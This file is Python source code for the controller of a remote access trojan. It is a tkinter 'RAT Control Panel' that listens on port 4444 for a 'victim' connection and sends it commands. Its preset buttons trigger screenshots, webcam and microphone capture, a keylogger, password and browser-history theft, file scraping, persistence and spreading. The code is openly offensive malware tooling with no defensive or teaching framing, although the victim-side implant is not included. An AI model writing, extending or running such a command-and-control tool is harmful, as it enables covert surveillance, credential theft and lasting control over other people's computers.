import socket
import threading
import tkinter as tk
from tkinter import scrolledtext, messagebox, simpledialog

HOST = ''  # Listen on all interfaces
PORT = 4444

class RATControlGUI:
    def __init__(self, master):
        self.master = master
        master.title("RAT Control Panel")

        self.client_socket = None
        self.connected = False

        # Text area for showing incoming victim messages
        self.txt_output = scrolledtext.ScrolledText(master, width=80, height=25, state='disabled')
        self.txt_output.grid(row=0, column=0, columnspan=5, padx=10, pady=10)

        # Entry for sending commands
        self.cmd_entry = tk.Entry(master, width=70)
        self.cmd_entry.grid(row=1, column=0, columnspan=4, padx=10, pady=5)
        self.cmd_entry.bind('<Return>', self.send_command)

        self.btn_send = tk.Button(master, text="Send", width=8, command=self.send_command)
        self.btn_send.grid(row=1, column=4, padx=5, pady=5)

        # Buttons for common commands
        commands = [
            ("Screenshot", "screenshot"),
            ("Webcam Snap", "webcam"),
            ("Start Stream", "stream"),
            ("Start Keylogger", "start_keylogger"),
            ("Microphone Record", "mic"),
            ("Speech Recognition", "start_speech_recognition"),
            ("Clipboard Monitor", "start_clipboard"),
            ("Idle Trigger", "idle"),
            ("Scrape Files", "scrape_files"),
            ("Get History", "get_history"),
            ("Get Passwords", "get_passwords"),
            ("Persist", "persist"),
            ("Spread", "spread"),
            ("Exit", "exit")
        ]

        for i, (label, cmd) in enumerate(commands):
            btn = tk.Button(master, text=label, width=15,
                            command=lambda c=cmd: self.send_predefined_command(c))
            btn.grid(row=2 + i // 3, column=i % 3, padx=5, pady=3)

        # Start server thread
        threading.Thread(target=self.start_server, daemon=True).start()

    def log(self, text):
        self.txt_output.config(state='normal')
        self.txt_output.insert(tk.END, text + "\n")
        self.txt_output.see(tk.END)
        self.txt_output.config(state='disabled')

    def start_server(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((HOST, PORT))
        self.server.listen(1)
        self.log(f"[+] Listening on port {PORT}... Waiting for victim...")
        self.client_socket, addr = self.server.accept()
        self.connected = True
        self.log(f"[+] Victim connected from {addr}")
        threading.Thread(target=self.receive_messages, daemon=True).start()

    def receive_messages(self):
        while True:
            try:
                data = self.client_socket.recv(4096)
                if not data:
                    self.log("[*] Connection closed by victim")
                    self.connected = False
                    break
                text = data.decode(errors='ignore')
                self.log(f"[Victim]: {text}")
            except Exception as e:
                self.log(f"[Error]: {e}")
                break

    def send_command(self, event=None):
        if not self.connected:
            messagebox.showerror("Error", "No victim connected!")
            return
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        try:
            self.client_socket.send(cmd.encode())
            self.log(f"[You]: {cmd}")
            if cmd == "exit":
                self.client_socket.close()
                self.connected = False
                self.log("[*] Connection closed.")
        except Exception as e:
            self.log(f"[Error sending command]: {e}")
        self.cmd_entry.delete(0, tk.END)

    def send_predefined_command(self, cmd):
        self.cmd_entry.delete(0, tk.END)
        self.cmd_entry.insert(0, cmd)
        self.send_command()

if __name__ == "__main__":
    root = tk.Tk()
    gui = RATControlGUI(root)
    root.mainloop()
